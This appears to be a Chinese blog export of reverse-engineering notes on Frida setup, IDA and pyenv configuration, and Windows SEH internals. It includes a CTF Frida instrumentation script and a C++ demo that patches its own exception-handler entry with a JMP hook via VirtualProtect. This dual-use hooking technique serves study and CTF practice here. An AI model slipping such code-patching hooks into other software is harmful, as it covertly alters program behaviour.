<p><em>可先安装客户端，知道客户端版本再去整服务端</em></p>
<h2 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h2><h3 id="直接使用pip"><a href="#直接使用pip" class="headerlink" title="直接使用pip"></a>直接使用pip</h3><blockquote>
<p>在终端内输入<code>pip install frida -i https://pypi.tuna.tsinghua.edu.cn/simple #使用清华源下载会快点，可以手动指定frida的version 可自行搜</code></p>
<p>无报错后输入<code>pip show frida #显示frida的详情</code>找到frida的version，需要记住这个version</p>
</blockquote>
<h2 id="服务端安装"><a href="#服务端安装" class="headerlink" title="服务端安装"></a>服务端安装</h2><p><a class="link"   href="https://github.com/frida/frida/releases/" >Releases · frida&#x2F;frida (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>找到之前客户端version一致的server</p>
<p>比如我的frida version是16.1.4</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401210240627.png"
                      alt="image-20240121024040573"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401210241008.png"
                      alt="image-20240121024119884"
                ></p>
<p>在github中找到16.1.4的assets并下载对应架构的server文件，手机基本上都是64位支持32位的，所以可以下载下面两种，<em>因为我是模拟器所以是x86架构而不是arm架构</em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401210243826.png"
                      alt="image-20240121024349729"
                ></p>
<p>xz文件时压缩包文件需要解压后发送给手机</p>
<p>通过adb发送文件给手机（具体adb连接教程可以在网上搜）</p>
<p>连接成功后</p>
<p>进行 <code>adb push </code>操作，将外部文件输入设备内</p>
<p><code>adb push 需要传输的文件位置  /data/local/tmp </code>       </p>
<p>&#x2F;data&#x2F;local&#x2F;tmp&#x2F;是不在手机重启保护的范围内的路径，不会因为手机重启而丢失数据，其他地方则不同，每次重启会丢失数据</p>
</blockquote>
<h2 id="进行连接"><a href="#进行连接" class="headerlink" title="进行连接"></a>进行连接</h2><p>frida-server传输成功后，在adb shell中启动对应位数的server</p>
<p>在电脑端命令行运行<code>frida-ps -U</code>#-U指通过USB我的虚拟机可以直接被当成usb设备连接</p>
<p>如果显示了你当前安装的进程就代表成功了</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>frida框架</category>
      </categories>
  </entry>
  <entry>
    <title>dll注入</title>
    <url>/2023/10/02/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/dll%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>ida</category>
      </categories>
  </entry>
  <entry>
    <title>ida界面设置</title>
    <url>/2023/10/02/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/ida%E7%95%8C%E9%9D%A2%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="添加窗口"><a href="#添加窗口" class="headerlink" title="添加窗口"></a>添加窗口</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202310021559856.png"
                      alt="image-20231002155911771"
                ></p>
<h2 id="移动窗口"><a href="#移动窗口" class="headerlink" title="移动窗口"></a>移动窗口</h2><h3 id="选中窗口将鼠标移动到灰线处-箭头所指的地方"><a href="#选中窗口将鼠标移动到灰线处-箭头所指的地方" class="headerlink" title="选中窗口将鼠标移动到灰线处(箭头所指的地方)"></a>选中窗口将鼠标移动到灰线处(箭头所指的地方)</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202310021601936.png"
                      alt="image-20231002160132898"
                ></p>
<p>长按将其拖动到一类位置(带有标记的地方),不同位置对应的不同效果可以自己试一试</p>
<h3 id=""><a href="#" class="headerlink" title=""></a><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202310021603990.png"
                      alt="image-20231002160330840"
                ></h3>]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>ida</category>
      </categories>
  </entry>
  <entry>
    <title>windbg+ida设置</title>
    <url>/2024/01/03/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/windbg+ida%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<p>进入ida目录&#x2F;cfg&#x2F;ida.cfg</p>
<p>如果你的ida是64位架构的则填入x64(我的ida是7.6 ida和ida64都是64位的)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401210154855.png"
                      alt="image-20240103222822214"
                ></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>ida</category>
      </categories>
  </entry>
  <entry>
    <title>idapython</title>
    <url>/2023/09/07/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/python/idapython/</url>
    <content><![CDATA[<p>个人感觉7.0版本的语法比较方便</p>
<p>具体修改方式</p>
<p>ida目录&#x2F;cfg&#x2F;idapython.cfg</p>
<p>将这一项AUTOIMPORT_COMPAT_IDA695 &#x3D; NO 修改为AUTOIMPORT_COMPAT_IDA695 &#x3D; YES</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>pyenv</title>
    <url>/2023/07/03/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/python/pyenv/</url>
    <content><![CDATA[<p>先装这几个依赖</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y build-essential libssl-dev zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libreadline-dev libffi-dev wget libsqlite3-dev libbz2-dev xz-utils tk-dev liblzma-dev llvm libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev build-essential</span><br></pre></td></tr></table></figure></div>

<p>然后再</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pyenv/pyenv ~/.pyenv#获取源码</span><br><span class="line">echo &#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc#配置环境变量</span><br><span class="line">source ~/.bashrc#应用修改</span><br></pre></td></tr></table></figure></div>

<p>就可以输入进行验证了</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pyenv version</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>基本用法</title>
    <url>/2024/07/30/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/windbg/%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://bbs.kanxue.com/thread-250670.htm#%E6%A0%87%E5%87%86%E5%91%BD%E4%BB%A4" >原创]Windbg新手入坑指南-软件逆向-看雪-安全社区|安全招聘|kanxue.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>windbg</category>
      </categories>
  </entry>
  <entry>
    <title>SEH</title>
    <url>/2024/03/17/Re/windows/pe/SEH/</url>
    <content><![CDATA[<p>参考<a class="link"   href="https://www.bookstack.cn/read/reverse-engineering-for-beginners-zh/spilt.16.spilt.35.book.md#5xd0vy" >第64章 传递参数的方法 - 68.3 Windows SEH - 《逆向工程权威指南》 - 书栈网 · BookStack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.yunzh1jun.com/2023/11/27/WindowsSEH2/" >Windows-SEH学习笔记（2） - 云之君’s Blog (yunzh1jun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/573449712" >windows SEH分析 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="基本结构为"><a href="#基本结构为" class="headerlink" title="基本结构为"></a>基本结构为</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">__try</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">//普通代码区域</span></span><br><span class="line">  &#125;</span><br><span class="line">  __except(filter)<span class="comment">//filter表示不同的处理形式</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="comment">//发生异常后进行处理</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong><code>__try</code></strong> 子句后的复合语句是主体或受保护节。 <strong><code>__except</code></strong> 表达式也称为筛选表达式。 它的值确定了异常的处理方式。 <strong><code>__except</code></strong> 子句后的复合语句是异常处理程序。 处理程序指定在执行主体期间引发异常时要采取的操作。 执行过程如下所示：</p>
<ol>
<li>执行受保护节(try语句)。</li>
<li>如果在受保护节执行过程中未发生异常，则继续执行 <strong><code>__except</code></strong> 子句之后的语句。</li>
<li>如果在受保护节的执行过程中或受保护节调用的任何例程中发生异常，则会计算 <strong><code>__except</code></strong> 表达式。 有三种可能的值：<ul>
<li><code>EXCEPTION_CONTINUE_EXECUTION</code> (-1) 异常已消除。 从出现异常的点继续执行。</li>
<li><code>EXCEPTION_CONTINUE_SEARCH</code> (0) 无法识别异常。 继续向上搜索堆栈查找处理程序，首先是所在的 <code>try-except</code> 语句，然后是具有下一个最高优先级的处理程序。</li>
<li><code>EXCEPTION_EXECUTE_HANDLER</code> (1) 异常可识别。 通过执行 <strong><code>__except</code></strong> 复合语句将控制权转移到异常处理程序，然后在 <strong><code>__except</code></strong> 块后继续执行。</li>
</ul>
</li>
</ol>
</blockquote>
<p>在ida中filter作为函数指针或函数地址存在，(32位中)eax作为其返回值对filter进行操纵</p>
<p>例如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004179E3 ;   __except filter // owned by 4179AC ; EXCEPTION_EXECUTE_HANDLER</span><br><span class="line">.text:004179E3 mov     eax, 1          ; 从异常发生处下一条开始执行</span><br><span class="line">.text:004179E8 retn                    ; Return Near from Procedure</span><br><span class="line">----------------</span><br><span class="line">.text:004179E9 ;   __except(loc_4179E3) // owned by 4179AC</span><br><span class="line">.text:004179E9 mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">.text:004179EC jmp     far ptr loc_4142A7 ; Jump</span><br></pre></td></tr></table></figure></div>

<p>这里的except的filter恒为1所以处理完即跳转</p>
<p>重要变量</p>
<blockquote>
<p><strong>[ebp+ms_exc.registration.TryLevel]</strong> 用于设置try等级，一般用于多层try嵌套情况，跳转到对应的except，如果值为-1表示不开启或者try域结束</p>
<p><strong>[ebp+ExceptionNum]</strong> 异常标识符，用于标识不同异常</p>
</blockquote>
<h2 id="FS寄存器"><a href="#FS寄存器" class="headerlink" title="FS寄存器"></a>FS寄存器</h2><h3 id="fs-0"><a href="#fs-0" class="headerlink" title="fs:[0]"></a>fs:[0]</h3><p>此处存放SEH链表，用于进行异常处理，当第一个不行就会跳转到next的第二个</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : Ptr32 _EXCEPTION_DISPOSITION </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>出现异常就会遍历这个SEH链表，直到</p>
<h3 id="fs-0x18"><a href="#fs-0x18" class="headerlink" title="fs:[0x18]"></a>fs:[0x18]</h3><p>TEB(Thread environment Block)起始地址</p>
<h3 id="fs-0x30"><a href="#fs-0x30" class="headerlink" title="fs:[0x30]"></a>fs:[0x30]</h3><p>PEB(Process environment Block)起始地址</p>
<h2 id="基本处理流程"><a href="#基本处理流程" class="headerlink" title="基本处理流程"></a>基本处理流程</h2><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>DubheCTF2024-Destination</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202403202020453.png"
                      alt="image-20240320202054288"
                ></p>
<p>通过frida插桩</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">except=<span class="keyword">function</span>(<span class="params">addr,str1</span>)&#123;<span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title function_">ptr</span>(addr),&#123;<span class="title function_">onEnter</span>(<span class="params">args</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n&quot;</span>+str1+<span class="string">&quot;:&quot;</span></span><br><span class="line">+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">context</span>))&#125;&#125;)&#125;</span><br><span class="line"><span class="title function_">except</span>(<span class="number">0x4140D7</span>,<span class="string">&quot;reg_excption&quot;</span>)<span class="comment">// try语句内注册的exception</span></span><br><span class="line"><span class="title function_">except</span>(<span class="number">0x4179E9</span>,<span class="string">&quot;old_excption&quot;</span>)<span class="comment">// 原有的except语句</span></span><br><span class="line"><span class="title function_">except</span>(<span class="number">0x4179E3</span>,<span class="string">&quot;filter&quot;</span>)<span class="comment">//filter 语句</span></span><br><span class="line"><span class="title function_">except</span>(<span class="number">0x4166BD</span>,<span class="string">&quot;my_except&quot;</span>)<span class="comment">//自己插入的恒返回1的exception处理函数</span></span><br></pre></td></tr></table></figure></div>

<p>保留注册操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202403220122453.png"
                      alt="image-20240322012221404"
                ></p>
<p>删去注册操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202403211816112.png"
                      alt="image-20240321181600029"
                ></p>
<p>输出为</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202403220112114.png"
                      alt="image-20240322011210069"
                ></p>
<p>说明seh链表中只有old_exception</p>
<h3 id="手动注册逻辑"><a href="#手动注册逻辑" class="headerlink" title="手动注册逻辑"></a>手动注册逻辑</h3><blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>    __stdcall <span class="title">CatchProc</span><span class="params">(EXCEPTION_RECORD* pExcept, <span class="type">void</span>* pErr, <span class="type">void</span>* pContext, <span class="type">void</span>* p_Dis)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//	if (pExcept-&gt;ExceptionCode == EXCEPTION_BREAKPOINT)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		printf(&quot;BREAKPOINT catched&quot;);</span></span><br><span class="line"><span class="comment">//		return 0;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;catched 0x%08X\n&quot;</span>, pExcept-&gt;ExceptionCode);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> __stdcall <span class="title">SetCatchProc</span><span class="params">(<span class="type">void</span>* pCProc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* p_ExpProcEntry;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, fs: [<span class="number">0</span>]</span><br><span class="line">		add eax, <span class="number">4</span></span><br><span class="line">		mov eax, dword ptr[eax]</span><br><span class="line">		mov p_ExpProcEntry, eax</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD p_oldProtect = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">VirtualProtect</span>(p_ExpProcEntry, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;p_oldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		*(BYTE*)p_ExpProcEntry = <span class="number">0xE9</span>;</span><br><span class="line">		*(DWORD*)(p_ExpProcEntry + <span class="number">1</span>) = (<span class="type">char</span>*)pCProc - p_ExpProcEntry - <span class="number">5</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">SetCatchProc</span>(CatchProc);</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> sum = <span class="number">5</span> / i;</span><br><span class="line">	<span class="type">char</span> p1[<span class="number">255</span>];</span><br><span class="line">	<span class="built_in">gets_s</span>(p1);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它的输出就是</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407151511174.png"
                      alt="image-20240715151146044"
                ></p>
<p>第一次是触发的除零异常，第二次则是在展开(unwind)时用于清理处理异常的一些参数</p>
<p>正常的异常处理会对这两个进行判断，而我们手动注册的没有对这两个进行判断，就相当于执行了两次</p>
<table>
<thead>
<tr>
<th align="left">异常代码</th>
<th align="left">异常的原因</th>
<th>CODE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">STATUS_ACCESS_VIOLATION</td>
<td align="left">读取或写入不可访问的内存位置。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_BREAKPOINT</td>
<td align="left">遇到硬件定义的断点；仅由调试器使用。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_DATATYPE_MISALIGNMENT</td>
<td align="left">在没有正确对齐的地址上读取或写入数据；例如，16 位实体必须在 2 字节边界对齐。 （不适用于 Intel 80 x 86 处理器。）</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_FLOAT_DIVIDE_BY_ZERO</td>
<td align="left">将浮点类型除以 0.0。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_FLOAT_OVERFLOW</td>
<td align="left">超过浮点类型的最大正指数。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_FLOAT_UNDERFLOW</td>
<td align="left">超过浮点类型的最小负指数的大小。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_FLOATING_RESEVERED_OPERAND</td>
<td align="left">使用保留的浮点格式（无效的使用格式）。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_ILLEGAL_INSTRUCTION</td>
<td align="left">尝试执行处理器未定义的指令代码。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_PRIVILEGED_INSTRUCTION</td>
<td align="left">执行当前计算机模式下不允许的指令。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_INTEGER_DIVIDE_BY_ZERO</td>
<td align="left">将整数类型除以 0。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_INTEGER_OVERFLOW</td>
<td align="left">尝试超出整数的范围的操作。</td>
<td></td>
</tr>
<tr>
<td align="left">STATUS_SINGLE_STEP</td>
<td align="left">以单步模式执行一条指令；仅由调试器使用。</td>
<td></td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> WIN32_NO_STATUS </span></span><br><span class="line"><span class="comment">/*lint -save -e767 */</span>  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_WAIT_0                           ((DWORD   )0x00000000L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ABANDONED_WAIT_0          ((DWORD   )0x00000080L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_USER_APC                  ((DWORD   )0x000000C0L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_TIMEOUT                   ((DWORD   )0x00000102L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_PENDING                   ((DWORD   )0x00000103L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_EXCEPTION_HANDLED            ((DWORD   )0x00010001L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_CONTINUE                     ((DWORD   )0x00010002L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SEGMENT_NOTIFICATION      ((DWORD   )0x40000005L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FATAL_APP_EXIT            ((DWORD   )0x40000015L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_REPLY_LATER                  ((DWORD   )0x40010001L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_TERMINATE_THREAD             ((DWORD   )0x40010003L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_TERMINATE_PROCESS            ((DWORD   )0x40010004L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_CONTROL_C                    ((DWORD   )0x40010005L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_PRINTEXCEPTION_C             ((DWORD   )0x40010006L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_RIPEXCEPTION                 ((DWORD   )0x40010007L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_CONTROL_BREAK                ((DWORD   )0x40010008L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_COMMAND_EXCEPTION            ((DWORD   )0x40010009L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_PRINTEXCEPTION_WIDE_C        ((DWORD   )0x4001000AL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_GUARD_PAGE_VIOLATION      ((DWORD   )0x80000001L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_DATATYPE_MISALIGNMENT     ((DWORD   )0x80000002L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_BREAKPOINT                ((DWORD   )0x80000003L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SINGLE_STEP               ((DWORD   )0x80000004L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_LONGJUMP                  ((DWORD   )0x80000026L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_UNWIND_CONSOLIDATE        ((DWORD   )0x80000029L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBG_EXCEPTION_NOT_HANDLED        ((DWORD   )0x80010001L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ACCESS_VIOLATION          ((DWORD   )0xC0000005L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_IN_PAGE_ERROR             ((DWORD   )0xC0000006L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INVALID_HANDLE            ((DWORD   )0xC0000008L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INVALID_PARAMETER         ((DWORD   )0xC000000DL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_NO_MEMORY                 ((DWORD   )0xC0000017L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ILLEGAL_INSTRUCTION       ((DWORD   )0xC000001DL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_NONCONTINUABLE_EXCEPTION  ((DWORD   )0xC0000025L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INVALID_DISPOSITION       ((DWORD   )0xC0000026L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ARRAY_BOUNDS_EXCEEDED     ((DWORD   )0xC000008CL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_DENORMAL_OPERAND    ((DWORD   )0xC000008DL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_DIVIDE_BY_ZERO      ((DWORD   )0xC000008EL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_INEXACT_RESULT      ((DWORD   )0xC000008FL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_INVALID_OPERATION   ((DWORD   )0xC0000090L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_OVERFLOW            ((DWORD   )0xC0000091L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_STACK_CHECK         ((DWORD   )0xC0000092L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_UNDERFLOW           ((DWORD   )0xC0000093L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INTEGER_DIVIDE_BY_ZERO    ((DWORD   )0xC0000094L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INTEGER_OVERFLOW          ((DWORD   )0xC0000095L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_PRIVILEGED_INSTRUCTION    ((DWORD   )0xC0000096L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_STACK_OVERFLOW            ((DWORD   )0xC00000FDL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_DLL_NOT_FOUND             ((DWORD   )0xC0000135L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ORDINAL_NOT_FOUND         ((DWORD   )0xC0000138L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ENTRYPOINT_NOT_FOUND      ((DWORD   )0xC0000139L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_CONTROL_C_EXIT            ((DWORD   )0xC000013AL)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_DLL_INIT_FAILED           ((DWORD   )0xC0000142L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_CONTROL_STACK_VIOLATION   ((DWORD   )0xC00001B2L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_MULTIPLE_FAULTS     ((DWORD   )0xC00002B4L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_FLOAT_MULTIPLE_TRAPS      ((DWORD   )0xC00002B5L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_REG_NAT_CONSUMPTION       ((DWORD   )0xC00002C9L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_HEAP_CORRUPTION           ((DWORD   )0xC0000374L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_STACK_BUFFER_OVERRUN      ((DWORD   )0xC0000409L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INVALID_CRUNTIME_PARAMETER ((DWORD   )0xC0000417L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ASSERTION_FAILURE         ((DWORD   )0xC0000420L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ENCLAVE_VIOLATION         ((DWORD   )0xC00004A2L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INTERRUPTED               ((DWORD   )0xC0000515L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_THREAD_NOT_RUNNING        ((DWORD   )0xC0000516L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ALREADY_REGISTERED        ((DWORD   )0xC0000718L)    </span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(STATUS_SUCCESS) || (_WIN32_WINNT &gt; 0x0500) || (_WIN32_FUSION &gt;= 0x0100) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SXS_EARLY_DEACTIVATION    ((DWORD   